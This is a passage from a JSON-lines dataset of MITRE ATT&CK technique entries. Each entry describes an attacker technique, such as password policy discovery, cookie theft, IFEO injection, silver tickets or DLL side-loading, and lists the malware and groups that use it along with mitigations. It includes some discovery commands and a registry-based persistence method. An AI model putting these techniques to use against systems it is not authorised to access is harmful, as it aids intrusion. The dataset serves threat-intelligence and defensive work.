list running processes.", "Ryuk has called <code>CreateToolhelp32Snapshot</code> to enumerate all running processes.", "yty gets an output of running processes using the <code>tasklist</code> command.", "Zeus Panda checks for running processes on the victim’s machine.", "MuddyWater has used malware to obtain a list of running processes on the system.", "Ramsay can gather a list of running processes by using Tasklist.", "Grandoreiro can identify installed security tools based on process names.", "PipeMon can iterate over the running processes to find a suitable injection target.", "Molerats actors obtained a list of active processes on the victim and sent them to C2 servers.", "JHUHUGIT obtains a list of running processes on the victim.", "SodaMaster can search a list of running processes.", "LookBack can list running processes.", "Magic Hound malware can list running processes.", "WINERACK can enumerate processes.", "RTM can obtain information about process integrity levels.", "Proxysvc lists processes running on the system.", "SoreFang can enumerate processes on a victim machine through use of Tasklist.", "ObliqueRAT can check for blocklisted process names on a compromised host.", "Emotet has been observed enumerating local processes.", "VERMIN can get a list of the processes and running tasks on the system.", "Bazar can identity the current process on a compromised host.", "TSCookie has the ability to list processes on the infected host.", "njRAT can search a list of running processes for Tr.exe.", "HELLOKITTY can search for specific processes to terminate."], "is_subtechnique": false}
{"text": " Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts). Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Password policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).", "idx": "https://attack.mitre.org/techniques/T1201", "title": "Password Policy Discovery", "entity": "Password Policy Discovery", "entity_type": "techniques", "entity_context": ["BloodHound can collect password policy information on the target environment.", "Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (<code>C:\\Windows\\System32\\</code> by default) of a domain controller and/or local computer with a corresponding entry in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>. ", "OilRig has used net.exe in a script with <code>net accounts /domain</code> to find the password policy of a domain.", "CrackMapExec can discover the password policies applied to the target system.", "PoshC2 can use <code>Get-PassPol</code> to enumerate the domain password policy.", "The <code>net accounts</code> and <code>net accounts /domain</code> commands with Net can be used to obtain password policy information.", "Turla has used <code>net accounts</code> and <code>net accounts /domain</code> to acquire password policy information.", "Chimera has used the NtdsAudit utility to collect information related to accounts and passwords.", "Kwampirs collects password policy information with the command <code>net accounts</code>."], "is_subtechnique": false}
{"text": " Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity) The simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity) In contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.", "idx": "https://attack.mitre.org/techniques/T1568/001", "title": "Fast Flux DNS", "entity": "Fast Flux DNS", "entity_type": "techniques", "entity_context": ["gh0st RAT\toperators have used dynamic DNS to mask the true location of their C2 behind rapidly changing IP addresses.", "menuPass has used dynamic DNS service providers to host malicious domains.", "TA505 has used fast flux to mask botnets by distributing payloads across multiple IPs.", "njRAT has used a fast flux DNS for C2 IP resolution."], "is_subtechnique": true}
{"text": " An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website. Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie) There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy (ex: [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena) After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.", "idx": "https://attack.mitre.org/techniques/T1539", "title": "Steal Web Session Cookie", "entity": "Steal Web Session Cookie", "entity_type": "techniques", "entity_context": ["CookieMiner can steal Google Chrome and Apple Safari browser cookies from the victim’s machine. ", "A physical second factor key that uses the target login domain as part of the negotiation protocol will prevent session cookie theft through proxy methods.", "XCSSET uses <code>scp</code> to access the <code>~/Library/Cookies/Cookies.binarycookies</code> file.", "BLUELIGHT can harvest cookies from Internet Explorer, Edge, Chrome, and Naver Whale browsers.", "EVILNUM can harvest cookies and upload them to the C2 server.", "Chaes has used a script that extracts the web session cookie and sends it to the C2 server. ", "Evilnum can steal cookies and session information from browsers.", "QakBot has the ability to capture web session cookies.", "Train users to identify aspects of phishing attempts where they're asked to enter credentials into a site that has the incorrect domain for the application they are logging into.", "TajMahal has the ability to steal web session cookies from Internet Explorer, Netscape Navigator, FireFox and RealNetworks applications.", "Grandoreiro can steal the victim's cookies to use for duplicating the active session from another device.", "Configure browsers or tasks to regularly delete persistent cookies."], "is_subtechnique": false}
{"text": " Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back). Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.", "idx": "https://attack.mitre.org/techniques/T1036/006", "title": "Space after Filename", "entity": "Space after Filename", "entity_type": "techniques", "entity_context": ["Keydnap puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program."], "is_subtechnique": true}
{"text": " Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).", "idx": "https://attack.mitre.org/techniques/T1589", "title": "Gather Victim Identity Information", "entity": "Gather Victim Identity Information", "entity_type": "techniques", "entity_context": ["Magic Hound has acquired mobile phone numbers of potential targets, possibly for mobile malware or additional phishing operations.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.", "APT32 has conducted targeted surveillance against activists and bloggers."], "is_subtechnique": false}
{"text": " Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)", "idx": "https://attack.mitre.org/techniques/T1113", "title": "Screen Capture", "entity": "Screen Capture", "entity_type": "techniques", "entity_context": ["POWERSTATS can retrieve screenshots from compromised hosts.", "Janicab captured screenshots and sent them out to a C2 server.", "RDAT can take a screenshot on the infected system.\t", "MarkiRAT can capture screenshots that are initially saved as ‘scr.jpg’.", "Dark Caracal took screenshots using their Windows malware.", "Cobian RAT has a feature to perform screen capture.", "njRAT can capture screenshots of the victim’s machines.", "StoneDrill can take screenshots.\t", "TajMahal has the ability to take screenshots on an infected host including capturing content from windows of instant messaging applications.", "TURNEDUP is capable of taking screenshots.", "Cadelspy has the ability to capture screenshots and webcam photos.", "BISCUIT has a command to periodically take screenshots of the system.", "Peppy can take screenshots on targeted systems.", "BADNEWS has a command to take a screenshot and send it to the C2 server.", "Kasidet has the ability to initiate keylogging and screen captures.", "PowerSploit's <code>Get-TimedScreenshot</code> Exfiltration module can take screenshots at regular intervals.", "EvilGrab has the capability to capture screenshots.", "Proton captures the content of the desktop with the screencapture binary.", "Magic Hound malware can take a screenshot and upload the file to its C2 server.", "BLUELIGHT has captured a screenshot of the display every 30 seconds for the first 5 minutes after initiating a C2 loop, and then once every five minutes thereafter.", "Kazuar captures screenshots of the victim’s screen.", "Empire is capable of capturing screenshots on Windows and macOS systems.", "Prikormka contains a module that captures screenshots of the victim's desktop.", "KONNI can take screenshots of the victim’s machine.", "Metamorfo can collect screenshots of the victim’s machine. ", "BadPatch captures screenshots in .jpg format and then exfiltrates them.", "T9000 can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.", "Octopus can capture screenshots of the victims’ machine.", "HotCroissant has the ability to do real time screen viewing on an infected host.", "Ursnif has used hooked APIs to take screenshots.", "Silence can capture victim screen activity.", "jRAT has the capability to take screenshots of the victim’s machine.", "CHOPSTICK has the capability to capture screenshots.", "HyperBro has the ability to take screenshots.", "A JHUHUGIT variant takes screenshots by simulating the user pressing the \"Take Screenshot\" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image.", "Flame can take regular screenshots when certain applications are open that are sent to the command and control server.", "Dragonfly 2.0 has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).", "Kivars has the ability to capture screenshots on the infected host.", "Pupy can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.", "Remcos takes automated screenshots of the infected machine.", "SMOKEDHAM can capture screenshots of the victim’s desktop.", "RTM can capture screenshots.", "Crimson contains a command to perform screen captures.", "ROKRAT captures screenshots of the infected system using the gdi32 library.", "FruitFly takes screenshots of the user's desktop.", "AppleSeed can take screenshots on a compromised host by calling a series of APIs.", "Agent Tesla can capture screenshots of the victim’s desktop.", "RemoteUtilities can take screenshots on a compromised host.", "DOGCALL is capable of capturing screenshots of the victim's machine.", "Turian has the ability to take screenshots.", "Chaes can capture screenshots of the infected machine.", "Valak has the ability to take screenshots on a compromised host.\t ", "NETWIRE can capture the victim's screen.", "PlugX allows the operator to capture screenshots.", "DustySky captures PNG screenshots of the main screen.", "CosmicDuke takes periodic screenshots and exfiltrates them.", "XCSSET saves a screen capture of the victim's system with a numbered filename and <code>.jpg</code> extension. Screen captures are taken at specified intervals based on the system. ", "Hydraq includes a component based on the code of VNC that can stream a live feed of the desktop of an infected host.", "Machete captures screenshots.", "Attor's has a plugin that captures screenshots of the target applications.", "InvisiMole can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.", "A variant of Zebrocy captures screenshots of the victim’s machine in JPEG and BMP format.", "Revenge RAT has a plugin for screen capture.", "TinyZBot contains screen capture functionality.", "Matryoshka is capable of performing screen captures.", "Catchamas captures screenshots based on specific keywords in the window’s title.", "yty collects screenshots of the victim machine.", "ZxShell can capture screenshots.", "gh0st RAT can capture the victim’s screen remotely.", "RedLeaves can capture screenshots.", "FIN7 captured screenshots and desktop video recordings.", "MacSpy can capture screenshots of the desktop over multiple monitors.", "XAgentOSX contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.", "BlackEnergy is capable of taking screenshots.", "Micropsia takes screenshots every 90 seconds by calling the Gdi32.BitBlt API.", "SLOTHFULMEDIA has taken a screenshot of a victim's desktop, named it \"Filter3.jpg\", and stored it in the local directory.", "Derusbi is capable of performing screen captures.", "UPPERCUT can capture desktop screenshots in the PNG format and send them to the C2 server.", "GRIFFON has used a screenshot module that can be used to take a screenshot of the remote system.", "POWRUNER can capture a screenshot from a victim.", "Daserf can take screenshots.", "Gamaredon Group's malware can take screenshots of the compromised computer every minute.\t", "Trojan.Karagany can take a desktop screenshot and save the file into <code>\\ProgramData\\Mail\\MailAg\\shot.png</code>.", "Carbanak performs desktop video recording and captures screenshots of the desktop and sends it to the C2 server.", "ECCENTRICBANDWAGON can capture screenshots and store them locally.", "VERMIN can perform screen captures of the victim’s machine.", "Cobalt Strike's Beacon payload is capable of capturing screenshots.", "ConnectWise can take screenshots on remote hosts.", "Zeus Panda can take screenshots of the victim’s machine.", "Aria-body has the ability to capture screenshots on compromised hosts.", "Azorult can capture screenshots of the victim’s machines.", "APT28 has used tools to take screenshots from victims.", "SharpStage has the ability to capture the victim's screen.", "SHUTTERSPEED can capture screenshots.", "Remexi takes screenshots of windows of interest.", "HALFBAKED can obtain screenshots from the victim.", "Ramsay can take screenshots every 30 seconds as well as when an external removable storage device is connected.", "OilRig has a tool called CANDYKING to capture a screenshot of user's desktop.", "BRONZE BUTLER has used a tool to capture screenshots.", "POORAIM can perform screen capturing.", "Malware used by Group5 is capable of watching the victim's screen.", "Carberp can capture display screenshots with the screens_dll.dll plugin.", "RogueRobin has a command named <code>$screenshot</code> that may be responsible for taking screenshots of the victim machine.", "LookBack can take desktop screenshots.", "GOLD SOUTHFIELD has used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines.", "Pteranodon can capture screenshots at a configurable interval.", "KeyBoy has a command to perform screen grabbing.", "RainyDay has the ability to capture screenshots.", "Bandook is capable of taking an image of and uploading the current desktop.", "Cardinal RAT can capture screenshots.", "Sliver can take screenshots of the victim’s active display.", "Cannon can take a screenshot of the desktop.", "ZLib has the ability to obtain screenshots of the compromised system.", "APT39 has used a screen capture utility to take screenshots on a compromised host.", "CrossRAT is capable of taking screen captures.", "FinFisher takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.", "Socksbot can take screenshots.", "MuddyWater has used malware that can capture screenshots of the victim’s machine.", "ObliqueRAT can capture a screenshot of the current screen.\n", "Rover takes screenshots of the compromised system's desktop and saves them to <code>C:\\system\\screenshot.bmp</code> for exfiltration every 60 minutes.", "KEYMARBLE can capture screenshots of the victim’s machine.", "PoetRAT has the ability to take screen captures."], "is_subtechnique": false}
{"text": " Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010) IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010) IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination", "idx": "https://attack.mitre.org/techniques/T1546/012", "title": "Image File Execution Options Injection", "entity": "Image File Execution Options Injection", "entity_type": "techniques", "entity_context": ["SDBbot has the ability to use image file execution options for persistence if it detects it is running with admin privileges on a Windows version newer than Windows 7.", "SUNBURST created an Image File Execution Options (IFEO) Debugger registry value for the process <code>dllhost.exe</code> to trigger the installation of Cobalt Strike.", "TEMP.Veles has modified and added entries within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code> to maintain persistence.\t\n"], "is_subtechnique": true}
{"text": " Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts. Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following: * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / Terminal Services (3389/TCP) * HTTP/HTTP Management Services (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP) In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)", "idx": "https://attack.mitre.org/techniques/T1110/004", "title": "Credential Stuffing", "entity": "Credential Stuffing", "entity_type": "techniques", "entity_context": ["Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.", "Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services.", "TrickBot uses brute-force attack against RDP with rdpscanDll module.", "Chimera has used credential stuffing against victim's remote services to obtain valid accounts.", "Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out.", "Refer to NIST guidelines when creating password policies. "], "is_subtechnique": true}
{"text": " Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations. By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)", "idx": "https://attack.mitre.org/techniques/T1583/002", "title": "DNS Server", "entity": "DNS Server", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets) Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets) Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).", "idx": "https://attack.mitre.org/techniques/T1558/002", "title": "Silver Ticket", "entity": "Silver Ticket", "entity_type": "techniques", "entity_context": ["Empire can leverage its implementation of Mimikatz to obtain and use silver tickets.", "Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. Also consider using Group Managed Service Accounts or another third party product such as password vaulting.", "Mimikatz's kerberos module can create silver tickets.", "Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators.", "Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible."], "is_subtechnique": true}
{"text": " Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017) Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.", "idx": "https://attack.mitre.org/techniques/T1202", "title": "Indirect Command Execution", "entity": "Indirect Command Execution", "entity_type": "techniques", "entity_context": ["Forfiles can be used to subvert controls and possibly conceal command execution by not directly invoking cmd.", "Revenge RAT uses the Forfiles utility to execute commands on the system."], "is_subtechnique": false}
{"text": " Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage. Use of compromised infrastructure allows an adversary to stage, launch, and execute an operation. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)", "idx": "https://attack.mitre.org/techniques/T1584", "title": "Compromise Infrastructure", "entity": "Compromise Infrastructure", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": false}
{"text": " Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s). Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)", "idx": "https://attack.mitre.org/techniques/T1574/002", "title": "DLL Side-Loading", "entity": "DLL Side-Loading", "entity_type": "techniques", "entity_context": ["Wingbird side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.", "BlackTech has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories. ", "HTTPBrowser has used DLL side-loading.", "Goopy has the ability to side-load malicious DLLs with legitimate applications from Kaspersky, Microsoft, and Google.", "APT32 ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder).", "PlugX has used DLL side-loading to evade anti-virus.", "Update software regularly to include patches that fix DLL side-loading vulnerabilities.", "Mustang Panda has used a legitimately signed executable to execute a malicious payload within a DLL file.", "GALLIUM used DLL side-loading to covertly load PoisonIvy into memory on the victim machine.", "Sidewinder has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.", "APT3 has been known to side load DLLs with a valid version of Chrome with one of their tools.", "ZeroT has used DLL side-loading to load malicious payloads.", "Waterbear has used DLL side loading to import and load a malicious DLL loader. ", "APT19 launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.", "Higaisa’s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the <code>OINFO12.OCX</code> dynamic link library.", "FinFisher uses DLL side-loading to load malicious programs.", "LookBack side loads its communications module as a DLL into the <code>libcurl.dll</code> loader.", "Nebulae can use DLL side-loading to gain execution.", "Javali can use DLL side-loading to load malicious DLLs into legitimate executables.", "Ecipekac can abuse the legitimate application policytool.exe to load a malicious DLL.", "Threat Group-3390 has used DLL side-loading, including by using legitimate Kaspersky antivirus variants in which the DLL acts as a stub loader that loads and executes the shell code.", "Sakula uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.", "Denis exploits a security vulnerability to load a fake DLL and execute its code.", "Tropic Trooper has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.", "BRONZE BUTLER has used legitimate applications to side-load malicious DLLs.", "Metamorfo has side-loaded its malicious DLL file. ", "RainyDay can use side-loading to run malicious executables.", "menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT.", "APT41 used legitimate executables to perform DLL side-loading of their malware. ", "HyperBro has used a legitimate application to sideload a DLL to decrypt, decompress, and run a payload.", "Kerrdown can use DLL side-loading to load malicious DLLs.", "Naikon has used DLL side-loading to load malicious DLL's into legitimate executables.", "DLL side-loading has been used to execute BBSRAT through a legitimate Citrix executable, ssonsvr.exe. The Citrix executable was dropped along with BBSRAT by the dropper.", "Egregor has used DLL side-loading to execute its payload. ", "A gh0st RAT variant has used DLL side-loading.", "Chimera has used side loading to place malicious DLLs in memory.", "BADNEWS typically loads its DLL file into a legitimate signed Java or VMware executable.", "During the T9000 installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.", "A Patchwork .dll that contains BADNEWS is loaded and executed using DLL side-loading.", "When possible, include hash values in manifest files to help prevent side-loading of malicious libraries."], "is_subtechnique": true}
{"text": " Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC). VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol) VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication) Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)", "idx": "https://attack.mitre.org/techniques/T1021/005", "title": "VNC", "entity": "VNC", "entity_type": "techniques", "entity_context": ["ZxShell supports functionality for VNC sessions. ", "Carberp can start a remote VNC session by downloading a new plugin.", "Inventory workstations for unauthorized VNC server software.", "Fox Kitten has installed TightVNC server and client on compromised servers and endpoints for lateral movement.", "GCMAN uses VNC for lateral movement.", "Proton uses VNC to connect into systems.", "FIN7 has used TightVNC to control compromised hosts.", "VNC defaults to TCP ports 5900 for the server, 5800 for browser access, and 5500 for a viewer in listening mode. Filtering or blocking these ports will inhibit VNC traffic utilizing default ports.", "Restrict software installation to user groups that require it. A VNC server must be manually installed by the user or adversary.", "TrickBot has used a VNC module to monitor the victim and collect information to pivot to valuable systems on the network ", "Uninstall any VNC server software where not required."], "is_subtechnique": true}
